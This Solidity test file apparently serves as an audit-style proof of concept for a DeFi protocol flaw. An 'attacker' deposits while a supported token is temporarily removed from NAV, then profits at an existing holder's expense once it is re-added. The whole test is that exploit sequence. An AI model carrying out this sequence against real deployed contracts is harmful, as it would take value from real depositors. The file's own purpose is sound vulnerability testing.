// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Registry} from "registry/Registry.sol";
import {AMM} from "../../../../src/contracts/AMM.sol";
import {Controller} from "../../../../src/contracts/Controller.sol";
import {EVE} from "../../../../src/contracts/EVE.sol";
import {Oracle} from "../../../../src/contracts/Oracle.sol";
import {StrategyManager} from "../../../../src/contracts/StrategyManager.sol";
import {Whitelist} from "../../../../src/contracts/Whitelist.sol";
import {Auth} from "../../../../src/libraries/Auth.sol";

import {ProtocolTestBase} from "../../../helpers/ProtocolTestBase.sol";
import {MockERC20} from "../../../mocks/MockERC20.sol";
import {MockPriceFeed} from "../../../mocks/MockPriceFeed.sol";

contract SupportedTokenRemovalTest is ProtocolTestBase {
    uint256 internal constant INITIAL_NATIVE_NAV = 10 ether;
    uint256 internal constant OMITTED_TOKEN_BALANCE = 120_000e18; // $120k = 30 ETH
    uint256 internal constant ATTACK_DEPOSIT = 1 ether;

    Registry internal registry;
    AMM internal amm;
    Controller internal controller;
    EVE internal eve;
    Oracle internal oracle;
    StrategyManager internal strategyManager;
    Whitelist internal whitelist;
    MockERC20 internal supportedToken;

    address internal holder;
    address internal attacker;
    address internal security;

    function setUp() public {
        holder = makeAddr("existingHolder");
        attacker = makeAddr("windowDepositor");
        security = makeAddr("securityMultisig");

        ProtocolContracts memory deployed = _deployProtocolInstances(address(this), DEFAULT_CONNECTOR_WEIGHT);
        _registerProtocolContracts(deployed.registry, deployed, address(this), true);
        _grantProtocolRoles(deployed.registry, deployed, address(this), address(this));

        registry = deployed.registry;
        amm = deployed.amm;
        controller = deployed.controller;
        eve = deployed.token;
        oracle = deployed.oracle;
        strategyManager = deployed.strategyManager;
        whitelist = deployed.whitelist;

        registry.grantRole(Auth.SECURITY_ROLE, security);

        oracle.updateUsdFeedInfo(address(0), address(new MockPriceFeed(8, 4_000e8)), 1 hours);
        supportedToken = new MockERC20("Emergency Paired Token", "EPT", 18);
        oracle.updateUsdFeedInfo(address(supportedToken), address(new MockPriceFeed(8, 1e8)), 1 hours);
        strategyManager.addSupportedERC20(address(supportedToken));

        address[] memory users = new address[](2);
        users[0] = holder;
        users[1] = attacker;
        whitelist.addToWhitelist(users);

        vm.deal(holder, INITIAL_NATIVE_NAV);
        vm.deal(attacker, 2 ether);
    }

    function test_RemoveEnterReaddDilutesHolderAndCreatesRealizableProfit() public {
        vm.prank(holder);
        amm.enter{value: INITIAL_NATIVE_NAV}(39_999e18);

        supportedToken.mint(address(strategyManager), OMITTED_TOKEN_BALANCE);
        assertEq(eve.totalSupply(), 40_000e18);
        assertEq(strategyManager.totalNAVInETH(), 40 ether);
        uint256 holderClaimBefore = eve.balanceOf(holder) * amm.eveBasePriceInETH() / 1e18;

        vm.prank(security);
        strategyManager.removeSupportedERC20(address(supportedToken));

        assertFalse(strategyManager.isSupportedERC20(address(supportedToken)));
        assertEq(supportedToken.balanceOf(address(strategyManager)), OMITTED_TOKEN_BALANCE);
        assertEq(strategyManager.totalNAVInETH(), INITIAL_NATIVE_NAV);
        assertFalse(amm.paused(), "token removal does not pause AMM entry");
        assertFalse(strategyManager.paused());

        uint256 attackerETHBefore = attacker.balance;
        vm.prank(attacker);
        amm.enter{value: ATTACK_DEPOSIT}(1);

        assertEq(eve.balanceOf(attacker), 2_000e18, "entry is priced against omitted 10 ETH NAV");
        assertEq(strategyManager.totalNAVInETH(), 11 ether);

        strategyManager.addSupportedERC20(address(supportedToken));

        assertTrue(strategyManager.isSupportedERC20(address(supportedToken)));
        assertEq(supportedToken.balanceOf(address(strategyManager)), OMITTED_TOKEN_BALANCE);
        assertEq(strategyManager.totalNAVInETH(), 41 ether);

        uint256 attackerClaim = eve.balanceOf(attacker) * amm.eveBasePriceInETH() / 1e18;
        uint256 holderClaimAfter = eve.balanceOf(holder) * amm.eveBasePriceInETH() / 1e18;
        assertGt(attackerClaim, 1.9 ether, "re-add makes the 1 ETH deposit worth about 1.95 ETH");
        assertGt(holderClaimBefore - holderClaimAfter, 0.9 ether, "existing holder funds the capture");

        vm.startPrank(attacker);
        eve.approve(address(amm), type(uint256).max);
        uint256 batchId = amm.exit(1.9 ether, eve.balanceOf(attacker), 0);
        vm.stopPrank();
        assertEq(batchId, 1);

        controller.priceBatch();
        controller.processRequest(batchId, attacker);
        vm.prank(attacker);
        amm.claim();

        assertGt(attacker.balance, attackerETHBefore + 0.89 ether, "captured value is paid from native backing");
    }
}
